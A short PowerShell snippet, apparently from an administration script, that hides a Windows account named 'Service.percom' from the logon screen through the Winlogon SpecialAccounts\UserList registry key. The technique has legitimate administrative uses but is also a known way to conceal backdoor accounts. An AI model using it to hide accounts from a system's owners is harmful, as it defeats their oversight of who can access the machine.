# Makes service.percom account hidden
$reghiddenaccountpath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
New-Item $reghiddenaccountpath -Force | New-ItemProperty -Name Service.percom -Value 0 -PropertyType DWord -Force | Out-Null
